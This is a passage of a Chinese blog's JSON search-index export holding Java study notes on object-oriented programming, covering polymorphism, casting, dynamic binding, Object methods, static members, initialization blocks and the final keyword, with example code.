<tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝</td>\n         <td style=\"text-align:center;\">微信</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["可搜索加密"],"categories":["Crypto"]},{"title":"Java-面向对象","url":"/posts/64598.html","content":"\n### 前言\n\n哈喽！大家好，我是小简。今天开始学习《Java-面向对象》，此系列是我做的一个 “Java 从 0 到 1 ” 实验，给自己一年左右时间，按照我自己总结的 [Java-学习路线](https://jwt1399.top/posts/29829.html)，从 0 开始学 Java 知识，并不定期更新所学笔记，期待一年后的蜕变吧！<有同样想法的小伙伴，可以联系我一起交流学习哦！>\n\n- [x] 🚩时间安排：预计12天更新完\n- [x] 🎯开始时间：02-07\n- [x] 🎉结束时间：02-20\n- [x] 🍀总结：这章很重要！！！学完了，但是笔记还没来得急更新完\n\n## 面向对象-基础\n\n### 类与对象\n\n### 成员方法\n\n### 方法递归\n\n### 方法重载\n\n### 可变参数\n\n### 作用域\n\n### 构造方法\n\n### 对象创建\n\n### this关键字\n\n## 面向对象-中级\n\n### 包\n\n### 访问修饰符\n\n### 封装\n\n### 继承\n\n### super关键字\n\n### 重写&重载\n\n### 多态\n\n#### 多态引出\n\n请编写一个程序，Master 类中有一个 feed 方法， 可以完成主人给动物喂食物的信息。\n\n使用传统的方法来解决带来的问题是什么? 如何解决?\n\n```java\npublic class Poly_ {\n    public static void main(String[] args) {\n        Master tom = new Master(\"Tom\");\n        Dog jack = new Dog(\"jack\");\n        Cat jerry = new Cat(\"jerry\");\n        Bone bone = new Bone(\"大骨头\");\n        Fish fish = new Fish(\"小鱼\");\n\n        tom.feed(jack,bone);\n        tom.feed(jerry,fish);\n    }\n}\n\nclass Master {\n    private String name;\n    public Master(String name) {\n        this.name = name;\n    }\n\t\t//主人给小狗喂食骨头\n     public void feed(Dog dog, Bone bone) {\n        System.out.println(\"主人\" + name + \" 给\" + dog.getName() + \" 吃\" + bone.getName());\n     }\n     //主人给小猫喂黄花鱼\n     public void feed(Cat cat, Fish fish) {\n        System.out.println(\"主人\" + name + \" 给\" + cat.getName() + \" 吃\" + fish.getName());\n     }\n}\n\nclass Animal {\n    private String name;\n    public Animal(String name) {\n        this.name = name;\n    }\n    public String getName() {\n        return name;\n    }\n}\n\nclass Dog extends Animal {\n    public Dog(String name) {\n        super(name);\n    }\n}\n\nclass Cat extends Animal {\n    public Cat(String name) {\n        super(name);\n    }\n}\n\nclass Food {\n    private String name;\n    public Food(String name) {\n        this.name = name;\n    }\n    public String getName() {\n        return name;\n    }\n}\n\nclass Bone extends Food {\n    public Bone(String name) {\n        super(name);\n    }\n}\n\nclass Fish extends Food {\n    public Fish(String name) {\n        super(name);\n    }\n}\n```\n\n带来的问题：\n\n- 如果动物很多，食物很多，feed 方法很多，不利于管理和维护\n- 代码的复用性不高，而且不利于代码维护\n\n解决方案： 采用多态解决\n\n```java\npublic class Poly_ {\n    public static void main(String[] args) {\n        Master tom = new Master(\"Tom\");\n        Dog jack = new Dog(\"jack\");\n        Cat jerry = new Cat(\"jerry\");\n        Bone bone = new Bone(\"大骨头\");\n        Fish fish = new Fish(\"小鱼\");\n\n        tom.feed(jack,bone);\n        tom.feed(jerry,fish);\n\n    }\n\n}\nclass Master {\n    private String name;\n    public Master(String name) {\n        this.name = name;\n    }\n    //使用多态机制，可以统一的管理主人喂食的问题\n\t\t//animal 编译类型是Animal,可以指向(接收) Animal 子类的对象\n\t\t//food 编译类型是Food ,可以指向(接收) Food 子类的对象\n    public void feed(Animal animal, Food food) {\n        System.out.println(\"主人\" + name + \" 给\" + animal.getName() + \" 吃\" + food.getName());\n    }\n}\n\nclass Animal {\n    private String name;\n    public Animal(String name) {\n        this.name = name;\n    }\n    public String getName() {\n        return name;\n    }\n}\n\nclass Dog extends Animal {\n    public Dog(String name) {\n        super(name);\n    }\n}\n\nclass Cat extends Animal {\n    public Cat(String name) {\n        super(name);\n    }\n}\n\nclass Food {\n    private String name;\n    public Food(String name) {\n        this.name = name;\n    }\n    public String getName() {\n        return name;\n    }\n}\n\nclass Bone extends Food {\n    public Bone(String name) {\n        super(name);\n    }\n}\n\nclass Fish extends Food {\n    public Fish(String name) {\n        super(name);\n    }\n}\n```\n\n#### 多态介绍\n\n方法或对象具有多种形态。是面向对象的第三大特征，多态是建立在封装和继承基础之上的。\n\n- 重载和重写都体现了多态\n\n- 一个对象的编译类型和运行类型可以不一致\n\n- 编译类型在定义对象时，就确定了，不能改变\n\n- 运行类型是可以变化的\n\n- 编译类型看定义时=号的左边，运行类型看=号的右边\n\n  ```java\n  Animal animal = new Dog()；//animal编译类型是Animal,运行类型Dog\n  animal = new Cat(); //animal的运行类型变成了Cat, 编译类型仍然是Animal\n  ```\n\n- 多态的前提是：两个对象(类)存在继承关系\n\n#### 多态的向上转型\n\n- 1)本质：父类的引用指向了子类的对象\n\n- 2)语法：父类类型 引用名 = new 子类类型();\n\n  - ```java\n    Animal animal = new Dog()；\n    ```\n\n- 3)特点：编译类型看左边，运行类型看右边\n\n  - 可以调用父类中的所有成员(需遵守访问权限)\n  - 不能调用子类中特有成员(属性/方法)\n  - 最终运行效果看子类的具体实现\n\n```java\npublic class PolyDetail {\n    public static void main(String[] args) {\n        //向上转型: 父类的引用指向了子类的对象\n        Animal_ animal = new Cat_();\n      \n        //可以调用父类中的所有成员(需遵守访问权限)\n        animal.eat();//吃\n        animal.sleep();//睡\n      \n        //不能调用子类中特有成员(属性/方法)\n        animal.catchMouse();//错误写法\n    }\n}\n\nclass Animal_ {\n    String name = \"动物\";\n    int age = 10;\n    public void sleep(){\n        System.out.println(\"睡\");\n    }\n    public void eat(){\n        System.out.println(\"吃\");\n    }\n}\n\nclass Cat_ extends Animal_ {\n    @Override\n    public void eat(){//方法重写\n        System.out.println(\"猫吃鱼\");\n    }\n    public void catchMouse(){//Cat 特有方法\n        System.out.println(\"猫抓老鼠\");\n    }\n}\n```\n\n#### 多态的向下转型\n\n- 1)语法：子类类型引用名 = (子类类型) 父类引用;\n\n  - ```java\n    Dog dog = (Dog) animal；\n    ```\n\n- 2)只能强转父类的引用，不能强转父类的对象\n\n- 3)要求父类的引用必须指向的是当前目标类型的对象\n\n- 4)当向下转型后，可以调用子类类型中所有的成员\n\n```java\npublic class PolyDetail {\n    public static void main(String[] args) {\n        Animal_ animal = new Cat_();\n       //向下转型：希望可以调用Cat的catchMouse 方法\n        Cat_ cat = (Cat_) anima;\n        cat.eat();//吃\n        cat.sleep();//睡\n        cat.catchMouse();//特有方法也可调用\n      \n        //要求父类的引用必须指向的是当前目标类型的对象\n        Dog dog = (Dog) animal; //错误写法\n    }\n}\n\nclass Animal_ {\n    String name = \"动物\";\n    int age = 10;\n    public void sleep(){\n        System.out.println(\"睡\");\n    }\n    public void eat(){\n        System.out.println(\"吃\");\n    }\n}\n\nclass Cat_ extends Animal_ {\n    @Override\n    public void eat(){//方法重写\n        System.out.println(\"猫吃鱼\");\n    }\n    public void catchMouse(){//Cat 特有方法\n        System.out.println(\"猫抓老鼠\");\n    }\n}\n\nclass Dog_ extends Animal_ {//Dog 是Animal 的子类\n}\n```\n\n#### 属性重写问题\n\n属性没有重写之说！属性的值看编译类型\n\n```java\npublic class PolyDetail02 {\n\t\tpublic static void main(String[] args) {\n        //属性没有重写之说！属性的值看编译类型\n        Base base = new Sub();//向上转型\n        System.out.println(base.count);//看编译类型10\n\n        Sub sub = new Sub();\n        System.out.println(sub.count);//20\n   }\n}\nclass Base { //父类\n\t\tint count = 10;//属性\n}\nclass Sub extends Base {//子类\n\t\tint count = 20;//属性\n}\n```\n\n#### instanceOf \n\n用于判断对象的**运行类型**是否为XX 类型或XX 类型的子类型\n\n```java\npublic class PolyDetail03 {\n      public static void main(String[] args) {\n          BB bb = new BB();\n          System.out.println(bb instanceof BB);//true\n          System.out.println(bb instanceof AA);//true\n          \n          //BB 是AA 子类\n          AA aa = new BB(); //aa 编译类型AA, 运行类型是BB\n          System.out.println(aa instanceof AA);//true\n          System.out.println(aa instanceof BB);//true\n        \n          Object obj = new Object();\n          System.out.println(obj instanceof AA);//false\n        \n          String str = \"hello\";\n          System.out.println(str instanceof Object);//true\n    }\n}\nclass AA {} //父类\nclass BB extends AA {}//子类\n```\n\n#### 动态绑定机制\n\n- 当调用对象方法的时候，该方法会和该对象的运行类型(内存地址)绑定\n- 当调用对象属性时，没有动态绑定机制，哪里声明，那里使用\n\n```java\npublic class DynamicBinding {\n    public static void main(String[] args) {\n        //a 的编译类型A, 运行类型B\n        A a = new B();//向上转型\n        //运行类型是B，先找B类里是否有sum，有就直接运行\n        System.out.println(a.sum());//40 调用子类sum\n        System.out.println(a.sum1());//30 调用子类sum1\n    }\n}\nclass A {//父类\n    public int i = 10;\n    public int sum() {//父类sum()\n        return getI() + 10;\n    }\n    public int sum1() {//父类sum1()\n        return i + 10;\n    }\n    public int getI() {//父类getI\n        return i;\n    }\n}\nclass B extends A {//子类\n    public int i = 20;\n\n     @Override\n     public int sum() {\n         return i + 20;\n     }\n\n    @Override\n    public int getI() {//子类getI()\n        return i;\n    }\n\n     @Override\n     public int sum1() {\n        return i + 10;\n     }\n}\n```\n\n\n\n```java\npublic class DynamicBinding {\n    public static void main(String[] args) {\n        //a 的编译类型A, 运行类型B\n        A a = new B();//向上转型 \n        //运行类型是B，先找B类里是否有sum，没有就去父类找\n        System.out.println(a.sum());//30 调用父类sum 和子类getI\n        System.out.println(a.sum1());//20 调用父类sum 和父类i\n    }\n}\nclass A {//父类\n    public int i = 10;\n    //动态绑定机制\n    public int sum() {//父类sum()\n        return getI() + 10;//20 + 10\n    }\n    public int sum1() {//父类sum1()\n        return i + 10;//10 + 10\n    }\n    public int getI() {//父类getI\n        return i;\n    }\n}\nclass B extends A {//子类\n    public int i = 20;\n    @Override\n    public int getI() {//子类getI()\n        return i;\n    }\n}\n```\n\n#### 多态的应用\n\n#####  多态数组\n\n数组的定义类型为父类类型，里面保存的实际元素类型为子类类型\n\n应用实例:现有一个继承结构如下：要求创建1 个Person 对象、2 个Student 对象和2 个Teacher 对象, 统一放在数组中，并调用每个对象 say 方法，如何调用子类特有的方法，比如 Teacher 有一个 teach , Student 有一个 study\n\n怎么调用？\n\n```java\npublic class PolyArray {\n    public static void main(String[] args) {\n        //应用实例:现有一个继承结构如下：要求创建1 个Person 对象、\n        // 2 个Student 对象和2 个Teacher 对象, 统一放在数组中，并调用每个对象say 方法\n        Person[] persons = new Person[5];\n        persons[0] = new Person(\"jack\", 20);\n        persons[1] = new Student(\"mary\", 18, 100);\n        persons[2] = new Student(\"smith\", 19, 30.1);\n        persons[3] = new Teacher(\"scott\", 30, 20000);\n        persons[4] = new Teacher(\"king\", 50, 25000);\n        //循环遍历多态数组，调用say\n        for (int i = 0; i < persons.length; i++) {\n            //person[i] 编译类型是Person ,运行类型是是根据实际情况有JVM 来判断\n            System.out.println(persons[i].say());//动态绑定机制\n            // 使用类型判断+ 向下转型\n            if(persons[i] instanceof Student) {//判断person[i] 的运行类型是不是Student\n                Student student = (Student)persons[i];//向下转型\n                student.study();\n            //也可以使用一条语句((Student)persons[i]).study();\n            } else if(persons[i] instanceof Teacher) {\n                Teacher teacher = (Teacher)persons[i];\n                teacher.teach();\n            } else if(persons[i] instanceof Person){\n            System.out.println(\"不做处理...\");\n            } else {\n                System.out.println(\"你的类型有误, 请自己检查...\");\n            }\n        }\n    }\n\n}\nclass Person {//父类\n    private String name;\n    private int age;\n    public Person(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n    public String getName() {\n        return name;\n    }\n    public String say() {//返回名字和年龄\n        return name + \"\\t\" + age;\n    }\n}\n\nclass Student extends Person {\n    private double score;\n    public Student(String name, int age, double score) {\n        super(name, age);\n        this.score = score;\n    }\n    //重写父类say\n    @Override\n    public String say() {\n        return \"学生\" + super.say() + \" score=\" + score;\n    }\n    //特有的方法\n    public void study() {\n        System.out.println(\"学生\" + getName() + \" 正在学java...\");\n    }\n}\n\n\nclass Teacher extends Person {\n    private double salary;\n    public Teacher(String name, int age, double salary) {\n        super(name, age);\n        this.salary = salary;\n    }\n    //写重写父类的say 方法\n    @Override\n    public String say() {\n        return \"老师\" + super.say() + \" salary=\" + salary;\n    }\n    //特有方法\n    public void teach() {\n        System.out.println(\"老师\" + getName() + \" 正在讲java 课程...\");\n    }\n}\n```\n\n##### 多态参数\n\n方法定义的形参类型为父类类型，实参类型允许为子类类型\n\n应用实例: 定义员工类 Employee，包含姓名和月工资[private]，以及计算年工资 getAnnual\n的方法。普通员工和经理继承了员工，经理类多了奖金 bonus 属性和管理 manage 方法，普通员工类多了 work 方法，普通员工和经理类要求分别重写 getAnnual 方法，测试类中添加一个方法 showEmpAnnual(Employee e)，实现获取任何员工对象的年工资，并在 main 方法中调用该方法[e.getAnnual()] 测试类中添加一个方法，testWork，如果是普通员工， 则调用 work 方法，如果是经\n理，则调用 manage方法\n\n```java\npublic class PolyParameter {\n    public static void main(String[] args) {\n        Worker tom = new Worker(\"tom\", 2500);\n        Manager milan = new Manager(\"milan\", 5000, 200000);\n        PolyParameter.showEmpAnnual(tom);\n        PolyParameter.showEmpAnnual(milan);\n        PolyParameter.testWork(tom);\n        PolyParameter.testWork(milan);\n    }\n\n    public static void showEmpAnnual(Employee e) {\n        System.out.println(e.getAnnual());\n    }\n\n    public static void testWork(Employee e) {\n        if (e instanceof Worker) {\n            ((Worker) e).work();//有向下转型操作\n        } else if (e instanceof Manager) {\n            ((Manager) e).manage();//有向下转型操作\n        } else {\n            System.out.println(\"不做处理...\");\n        }\n    }\n}\n\nclass Employee {\n  private String name;\n  private double salary;\n\n  public Employee(String name, double salary) {\n    this.name = name;\n    this.salary = salary;\n  }\n\n  public String getName() {\n    return name;\n  }\n\n  public double getSalary() {\n    return salary;\n  }\n\n  public double getAnnual() {\n    return 12 * salary;\n  }\n}\n\nclass Worker extends Employee {\n  public Worker(String name, double salary) {\n    super(name, salary);\n  }\n\n  public void work() {\n    System.out.println(\"普通员工\" + getName() + \" is working\");\n  }\n\n  @Override\n  public double getAnnual() {\n    return super.getAnnual();\n  }\n}\n\nclass Manager extends Employee {\n  private double bonus;\n\n  public Manager(String name, double salary, double bonus) {\n    super(name, salary);\n    this.bonus = bonus;\n  }\n\n  public void manage() {\n    System.out.println(\"经理\" + getName() + \" is managing\");\n  }\n\n  @Override\n  public double getAnnual() {\n    return super.getAnnual() + bonus;\n  }\n}\n```\n\n\n\n### Object类\n\n#### equals\n\nequals 是 Object 类中的方法，只能判断引用类型，默认判断的是地址是否相等，子类中往往重写该方法，用于判断内容是否相等。比如 Integer，String \n\n**== 和 equals 的对比**\n\n- == 是一个比较运算符\n\n  - 1.既可以判断基本类型，又可以判断引用类型\n\n  - 2.如果判断基本类型，判断的是值是否相等。\n\n  - 3.如果判断引用类型，判断的是地址是否相等，即判定是不是同一个对象\n\n- equals 是 Object 类中的方法，只能判断引用类型，默认判断的是地址是否相等\n\n**如何重写 equals 方法**\n\n🌰：判断两个 Person 对象的内容是否相等，如果两个 Person 对象的各个属性值都一样，则返回true，反之false\n\n```java\npublic class EqualsExercise01 {\npublic static void main(String[] args) {\n    Person person1 = new Person(\"jack\", 10, '男');\n    Person person2 = new Person(\"jack\", 20, '男');\n    System.out.println(person1.equals(person2));//假\n\t}\n}\n//判断两个Person 对象的内容是否相等，\n//如果两个Person 对象的各个属性值都一样，则返回true，反之false\nclass Person{ //extends Object\n    private String name;\n    private int age;\n    private char gender;\n  \n\t\t//重写Object 的equals 方法\n\t\tpublic boolean equals(Object obj) {\n      //判断如果比较的两个对象是同一个对象，则直接返回true\n      if(this == obj) {\n      return true;\n      }\n      //类型判断\n      if(obj instanceof Person) {//是Person，我们才比较\n      \t\t//进行向下转型, 因为我需要得到obj 的各个属性\n          Person p = (Person)obj;\n          return this.name.equals(p.name) && this.age == p.age && this.gender == p.gender;\n      }\n      //如果不是Person ，则直接返回false\n      return false;\n    }\n  \n  \tpublic Person(String name, int age, char gender) {\n      this.name = name;\n      this.age = age;\n      this.gender = gender;\n    }\n}\n```\n\n#### hashCode\n\n返回该对象的哈希码值。此方法是为了提高哈希表的性能。\n\n- 两个引用，如果指向的是同一个对象，则哈希值肯定是一样的！\n\n- 两个引用，如果指向的是不同对象，则哈希值是不一样的。\n\n- 哈希值主要根据地址号来的！，但是 不能完全将哈希值等价于地址。\n- 集合中 hashCode 如果需要的话，也会重写。\n\n####  toString\n\n- 默认返回：全类名(包名+类名)+@+哈希值的十六进制\n\n- 子类往往重写toString 方法，用于返回对象的属性信息\n- 重写 toString 方法，打印对象或拼接对象时，都会自动调用该对象的toString 形式\n- 当直接输出一个对象时， toString 方法会被默认的调用\n  - 比如System.out.println(monster) ； 就会默认调用 monster.toString()\n\n#### finalize\n\n当对象被回收时，系统自动调用该对象的 finalize 方法。子类可以重写该方法，做一些释放资源的操作\n\n什么时候被回收：当某个对象没有任何引用时，则 jvm 就认为这个对象是一个垃圾对象，就会使用垃圾回收机制来销毁该对象，在销毁该对象前，会先调用finalize 方法。\n\n垃圾回收机制的调用，是由系统来决定(即有自己的GC 算法), 也可以通过System.gc() 主动触发垃圾回收机制\n\n```java\npublic class Finalize_ {\n//如果程序员不重写finalize,那么就会调用Object类的finalize, 即默认处理\n//如果程序员重写了finalize, 就可以实现自己的逻辑\n\t\tpublic static void main(String[] args) {\n\t\t\t\tCar bmw = new Car(\"宝马\");\n      \t//这时car对象就是一个垃圾\n      \t//垃圾回收器就会回收(销毁)对象, \n      \t//在销毁对象前，会调用该对象的finalize 方法\n      \tbmw = null;\n        System.gc();//主动调用垃圾回收器\n        System.out.println(\"程序退出了....\");\n\t\t}\n}\nclass Car {\n\t\tprivate String name;\n    public Car(String name) {\n    \t\tthis.name = name;\n    }\n\t\t//重写finalize\n    @Override\n    protected void finalize() throws Throwable {\n    \t\tSystem.out.println(\"我们销毁汽车\" + name );\n    \t\tSystem.out.println(\"释放了某些资源...\");\n    }\n}\n```\n\n## 面向对象-高级\n\n###  类变量(静态变量)\n\n####  **类变量简介**\n\n类变量（又叫静态变量）是`该类的所有对象共享的变量`，任何一个该类的对象去访问它时，取到的都是相同的值，同样任何一个该类的对象去修改它时，修改的也是同一个变量。\n\n#### **类变量内存布局**\n\n- jdk8 及以前版本，放在静态域；\n\n- jdk8 以后版本，放在堆中，当你的类加载的时候会在堆中生成一个类的 class 对象，静态变量就在 class 对象尾部。\n\n#### 类变量特点\n\n- 类变量是同一个类所有对象实例共享的\n- 类变量，在类加载的时候就生成了\n  - **(即类加载的时候就会初始化类变量，即使没有创建类对象实例也可通过类名访问)**\n- 类变量的生命周期是随类的加载开始，随着类的消亡而销毁。\n\n#### 类变量的定义\n\n- 访问修饰符 static 数据类型 变量名【推荐使用】\n- static  访问修饰符 数据类型 变量名\n\n#### 类变量的访问\n\n- 类名.类变量名【推荐使用】\n- 对象名.类变量名\n\n#### 类变量使用场景\n\n当我们需要让某个类的所有对象都共享一个变量时，就可以考虑使用类变量(静态变量)。比如:定义学生类，统计所有学生共交多少钱。Student (name, static fee)\n\n#### 类变量与普通变量\n\n- 类变量是该类的所有对象共享的\n- 实例变量(普通变量/类成员变量/非静态变量)是每个对象独享的\n\n#### 代码理解类变量\n\n```java\npublic class ChildGame {\n    public static void main(String[] args) {\n        //普通方法需定义一个变量 count, 统计有多少小孩加入了游戏\n        //int count = 0;\n        Child child1 = new Child(\"白骨精\");\n        child1.join();\n        //count++;\n        child1.count++;\n        Child child2 = new Child(\"狐狸精\");\n        child2.join();\n        //count++;\n        child2.count++;\n        Child child3 = new Child(\"老鼠精\");\n        child3.join();\n        //count++;\n        child3.count++;\n\n        //类变量，可以通过类名来访问,也可通过对象名访问\n        System.out.println(\"共有\" + Child.count + \" 小孩加入了游戏...\");\n        System.out.println(\"child1.count=\" + child1.count);//3\n        System.out.println(\"child2.count=\" + child2.count);//3\n        System.out.println(\"child3.count=\" + child3.count);//3\n    }\n}\n\nclass Child {\n    private String name;\n    public static int count = 0;  //该变量最大的特点就是会被 Child 类的所有的对象实例共享\n    public Child(String name) {\n        this.name = name;\n    }\n    public void join() {\n        System.out.println(name + \" 加入了游戏..\");\n    }\n}\n```\n\n### 类方法(静态方法)\n\n> 类方法，无需创建类的对象即可对其进行访问\n\n#### 类方法定义\n\n- 访问修饰符 static 数据返回类型 方法名(){}【推荐使用】\n- static  访问修饰符 数据返回类型 方法名(){}\n\n#### 类方法访问\n\n- 类名.类方法名【推荐使用】\n- 对象名.类方法名\n\n#### 类方法使用场景\n\n- 当方法中不涉及到任何和对象相关的成员，则可以将方法设计成静态方法，提高开发效率。\n- 比如工具类中的方法 Utils， Math类、Arrays类、Collections集合类\n- 在实际开发中，往往将一些通用的方法，设计成静态方法，这样我们不需要创建对象就可以使用，比如打印一维数组，冒泡排序等等\n\n#### 类方法与普通方法\n\n- 类方法和普通方法都是随着类的加载而加载，将结构信息存储在方法区：类方法中无 this 的参数，普通方法中隐含着 this 的参数。\n- 类方法可以通过类名或对象名调用，而普通方法只能通过对象名调用。\n- 类方法中不允许使用和对象有关的关键字，比如 `this` 、`super`；普通方法可以。（因为当用`类名.类方法名`调用的时候，this 和 super 指示不明）\n- 类方法中只能访问静态变量或静态方法；而普通方法既可以访问普通变量（方法），也可以访问静态变量（方法）。\n- 类方法可以被子类继承，但是不能被子类重写\n\n####  代码理解类方法\n\n```java\npackage com.jwt.static_;\n\npublic class StaticMethod {\n    public static void main(String[] args) {\n        //创建两个学生交学费\n        Stu tom = new Stu(\"Tom\");\n        tom.payFee(100);\n        Stu mary = new Stu(\"mary\");\n        mary.payFee(200);\n        Stu.showFee();\n    }\n}\n\nclass Stu{\n    private String name;\n    private static  double fee = 0;//静态变量累积学费\n    public Stu(String name) {\n        this.name = name;\n    }\n    public static void payFee(double fee){//静态方法可访问静态变量\n        Stu.fee += fee;\n    }\n    public static void showFee(){\n        System.out.println(\"总学费：\" + Stu.fee);\n    }\n}\n```\n\n### main方法\n\n#### 深入理解main方法\n\nmain 方法的形式: `public static void main(String[] args){}`\n\n- **public：**main 方法是 JVM 调用的，该方法的访问权限必须是 public；\n\n- **static：**Java虚拟机在执行main()方法时不必创建对象，所以该方法必须是 static；\n\n- **args：**该方法接收 String 类型的数组参数，该数组中保存执行 Java 命令时传递给所运行的类的参数\n\n  | ![](https://img.jwt1399.top/img/202111082204040.png) | ![](https://img.jwt1399.top/img/202111082204894.png) |\n  | ---------------------------------------------------- | ---------------------------------------------------- |\n\n#### 特别注意\n\n- 在 main() 方法中，我们可以直接调用 main 方法所在类的静态方法或静态属性。\n\n- 但是，不能直接访问该类中的非静态成员，必须创建该类的一个实例对象后，才能通过这个对象去访问类中的非静态成员。\n\n#### IDEA 中给main传参数\n\n| 第一步                                               | 第二步                                               |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202111082222881.png) | ![](https://img.jwt1399.top/img/202111082222273.png) |\n\n### 代码块\n\n#### 简介\n\n代码块又称为 **初始化块**，属于类中的成员，类似于方法，将逻辑语句封装在方法体中，通过 { } 包围起来，但和方法不同，没有方法名，没有返回，没有参数，只有方法体，而且不用通过对象或类显式调用，而是加载类时或创建对象时隐式调用。\n\n#### 代码块语法\n\n```java\n[修饰符]{\n\t这里是代码；\n};\n```\n\n**说明：**\n\n- 修饰符可选，要写的话，也只能写 static\n- 代码块分为两类，使用 static 修饰的叫静态代码块，没有 static 修饰的，叫普通代码块\n-  块中代码可以为任何逻辑语句（输入、输出、方法调用、循环、判断等）\n- 分号，可以写上，也可以省略\n\n#### 代码块的好处\n\n首先看下面代码，三个构造器都有相同的语句，这样代码看起来比较冗余，如何简化代码呢？\n\n```java\npublic class CodeBlock01 {\n    public static void main(String[] args) {\n        Movie movie = new Movie(\"你好，李焕英\");\n        System.out.println(\"===============\");\n        Movie movie2 = new Movie(\"唐探3\", 100, \"陈思诚\");\n    }\n}\n\nclass Movie {\n    private String name;\n    private double price;\n    private String director;\n\n    //3个构造器-》重载\n    public Movie(String name) {\n        System.out.println(\"电影屏幕打开...\");\n        System.out.println(\"广告开始...\");\n        System.out.println(\"电影正是开始...\");\n        System.out.println(\"Movie(String name) 被调用...\");\n        this.name = name;\n    }\n\n    public Movie(String name, double price) {\n        System.out.println(\"电影屏幕打开...\");\n        System.out.println(\"广告开始...\");\n        System.out.println(\"电影正是开始...\");\n        this.name = name;\n        this.price = price;\n    }\n\n    public Movie(String name, double price, String director) {\n        System.out.println(\"电影屏幕打开...\");\n        System.out.println(\"广告开始...\");\n        System.out.println(\"电影正是开始...\");\n        System.out.println(\"Movie(String name, double price, String director) 被调用...\");\n        this.name = name;\n        this.price = price;\n        this.director = director;\n    }\n}\n```\n\n这时我们可以把相同的语句，放入到一个代码块中，这样当我们**不管调用哪个构造器创建对象，都会先调用代码块的内容，代码块调用的顺序优先于构造器**\n\n```java\n{\n    System.out.println(\"电影屏幕打开...\");\n    System.out.println(\"广告开始...\");\n    System.out.println(\"电影正是开始...\");\n};\n```\n\n**改进后代码：**\n\n```java\npublic class CodeBlock01 {\n    public static void main(String[] args) {\n        Movie movie = new Movie(\"你好，李焕英\");\n        System.out.println(\"===============\");\n        Movie movie2 = new Movie(\"唐探3\", 100, \"陈思诚\");\n    }\n}\n\nclass Movie {\n    private String name;\n    private double price;\n    private String director;\n    \n\t//代码块\n    {\n        System.out.println(\"电影屏幕打开...\");\n        System.out.println(\"广告开始...\");\n        System.out.println(\"电影正是开始...\");\n    };\n\t//3个构造器-》重载\n    public Movie(String name) {\n        System.out.println(\"Movie(String name) 被调用...\");\n        this.name = name;\n    }\n\n    public Movie(String name, double price) {\n        this.name = name;\n        this.price = price;\n    }\n\n    public Movie(String name, double price, String director) {\n        System.out.println(\"Movie(String name, double price, String director) 被调用...\");\n        this.name = name;\n        this.price = price;\n        this.director = director;\n    }\n}\n```\n\n**总结**\n\n- 代码块相当于另外一种形式的构造器（对构造器的补充机制），可以做初始化的操作。\n- 如果多个构造器中都有重复的语句，可以抽取到初始化块中，提高代码的复用性\n\n#### 重点\n\n- static 代码块也叫静态代码块，作用就是对类进行初始化，而且它随着类的加载而执行，并且只会执行一次。\n\n- 类什么时候被加载\n  - 创建对象实例时（new）\n  - 创建子类对象实例，父类也会被加载\n  - 使用类的静态成员时（静态方法，静态属性）\n\n- 普通的代码块，在创建对象实例时，会被隐式的调用。被创建一次，就会调用一次。\n- 如果只是使用类的静态成员时，普通代码块并不会执行。\n\n- 创建一个对象时，它们的调用顺序是：\n  - ➀首先调用静态代码块和静态属性初始化（注意：静态代码块和静态属性初始化调用的优先级一样，如果有多个静态代码块和多个静态变量初始化，则按他们定义的顺序调用）\n  - ➁再调用普通代码块和普通属性的初始化（注意：普通代码块和普通属性初始化调用的优先级一样，如果有多个普通代码块和多个普通属性初始化，则按定义顺序调用）\n  - ➂最后调用构造方法。\n\n- 构造器的最前面其实隐含了 super() 和调用普通代码块。\n- 静态代码块只能直接调用静态成员（静态属性和静态方法），普通代码块可以调用任意成员\n\n- 创建一个子类对象时，在一个类调用顺序是：\n  - ➀ 父类的静态代码块和静态属性初始化（优先级一样，按定义顺序执行）\n  - ➁ 子类的静态代码块和静态属性初始化（优先级一样，按定义顺序执行）\n  - ➂ 父类的普通代码块和普通属性初始化（优先级一样，按定义顺序执行）\n  - ➃ 父类的构造方法\n  - ➄ 子类的普通代码块和普通属性初始化\n  - ➅ 子类的构造方法\n\n总结：\n1——根据static代码块是在类加载时被调用，当要创建子类这个对象时，发现这个类需要一个父类，所以把父类的 .class 加载进来，故先是父类的静态代码块或静态属性初始化；\n2——然后是加载子类的类信息，故是子类的静态代码块或静态属性初始化；\n3——然后走进子类构造器的super语句，进入父类的构造器，先super()，然后调用父类普通代码块，故是父类的普通代码块或普通属性初始化；\n4——然后父类构造器调用完毕，即是父类的构造方法；\n5——然后回到子类的构造方法中隐含的调用普通代码块或普通属性的初始化；\n6——然后完成子类的构造器，故最后是子类的构造方法。\n\n### 单例模式\n\n#### 饿汉式\n\n\n\n#### 懒汉式\n\n\n\n### final关键字\n\nfinal 在 Java 中的意思是最终，也可以称为完结器，表示对象是最终形态的，不可改变的意思。final 可以修饰类、 属性、方法和局部变量，在某些情况下，就会使用到 final:\n1) 当不希望类被继承时，可以用 final 修饰\n2) 当不希望父类的某个方法被子类覆盖/重写(override)时可以用 final 关键字修饰\n3) 当不希望类的的某个属性的值被修改，可以用 final 修饰\n4) 当不希望某个局部变量被修改，可以使用 final 修饰\n\n```java\n//1.如果我们要求A 类不能被其他类继承\n//可以使用final 修饰A 类\nfinal class A {\n}\n\n//class B extends A {}  //会报错\n\nclass C {\n    //2.如果我们要求hi 不能被子类重写\n    //可以使用final 修饰hi 方法\n    public final void hi() {\n    }\n}\n\nclass D extends C {\n// @Override   //会报错\n// public void hi() {\n// System.out.println(\"重写了C 类的hi 方法..\");\n// }\n}\n\n//3.当不希望类的的某个属性的值被修改,可以用final 修饰\nclass E {\n    public final double TAX_RATE = 0.08;//常量\n}\n\n//4.当不希望某个局部变量被修改，可以使用final 修饰\nclass F {\n    public void cry() {\n        //这时，NUM 也称为局部常量\n        final double NUM = 0.01;\n        //NUM = 0.9; //会报错\n        System.out.println(\"NUM=\" + NUM);\n    }\n}\n```\n\n**注意事项**\n\n1) final 修饰的属性又叫常量，一般用 XX_XX_XX 来命名\n\n2) final 修饰的属性在定义时，必须赋初值，并且以后不能再修改，赋值可以在如下位置之一:\n\n  - ①定义时\n\n  - ```java\n    public final double TAX 